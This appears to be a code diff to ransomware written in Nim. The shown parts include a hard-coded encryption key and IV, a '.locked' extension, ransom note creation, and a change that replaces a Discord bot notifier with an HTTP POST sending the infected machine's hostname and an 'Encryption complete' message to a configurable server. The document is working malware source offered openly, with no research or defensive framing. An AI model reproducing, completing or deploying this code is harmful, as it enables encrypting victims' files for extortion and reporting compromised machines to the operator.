@@ -1,4 +1,4 @@
-import os, nimcrypto, strutils, osproc, dimscord, asyncdispatch, options
+import os, nimcrypto, strutils, osproc, asyncdispatch, httpclient
 
 const defaultHtml = """
 <!DOCTYPE html>
@@ -55,8 +55,7 @@ const key* = "0123456789abcdef0123456789abcdef"
 const iv* = "abcdef9876543210"
 const extension* = ".locked"
 var htmlContent* = "YOUR_HTML_RANSOM_NOTE_CONTENT_HERE"
-const discordToken* = "YOUR_DISCORD_BOT_TOKEN"
-const creatorId* = "YOUR_DISCORD_USER_ID"
+const serverUrl* = "http://localhost:8080"
 
 proc processFile(file: string, key: string, iv: string, extension: string) =
   try:
@@ -128,18 +127,19 @@ proc getHostname(): string =
 
 let machineName = getHostname()
 
-proc sendDiscordMessage(message: string) {.async.} =
-  if discordToken.len == 0 or creatorId.len == 0:
-    echo "Discord token or creator ID is missing. Skipping notification."
+proc sendNotification(message: string) {.async.} =
+  if serverUrl.len == 0:
+    echo "Server URL not configured. Skipping notification."
     return
   
-  let discord = newDiscordClient(discordToken)
-  
   try:
-    let dm = await discord.api.createUserDm(creatorId)
-    discard await discord.api.sendMessage(dm.id, machineName & ": " & message)
+    let client = newHttpClient()
+    let data = "{\"hostname\":\"" & machineName & "\",\"message\":\"" & message & "\"}"
+    client.headers = newHttpHeaders({"Content-Type": "application/json"})
+    let response = client.postContent(serverUrl & "/notify", body = data)
+    echo "Notification sent to HTTP server: ", message
   except Exception as e:
-    echo "Failed to send Discord message: ", e.msg
+    echo "Failed to send notification to HTTP server: ", e.msg
 
 proc main() =  
   when defined(decrypt):
@@ -192,5 +192,5 @@ proc main() =
       echo "Ransom note created at ", ransomFile
     except OSError as e:
       echo "Error creating or opening ransom note: ", e.msg
-    waitFor sendDiscordMessage("Encryption complete")
+    waitFor sendNotification("Encryption complete")
 
